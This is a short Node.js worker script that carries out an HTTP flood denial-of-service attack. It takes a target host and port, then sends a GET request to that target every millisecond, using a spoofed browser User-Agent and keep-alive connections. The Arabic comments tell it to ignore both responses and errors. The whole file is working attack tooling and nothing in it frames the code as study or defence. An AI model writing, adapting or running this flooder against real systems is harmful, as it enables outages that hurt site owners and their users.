const { parentPort } = require('worker_threads');
const http = require('http');

parentPort.on('message', (msg) => {
    const { target, port } = msg;
    console.log(`🚀 HTTP Flood started on ${target}:${port}`);

    setInterval(() => {
        const options = {
            hostname: target,
            port: port || 80,
            path: '/index.html',
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Connection': 'keep-alive'
            }
        };

        const req = http.request(options, (res) => {
            // تجاهل الرد
        });

        req.on('error', (e) => {
            // تجاهل الأخطاء
        });

        req.end();
    }, 1); // طلب واحد كل ميلي ثانية
});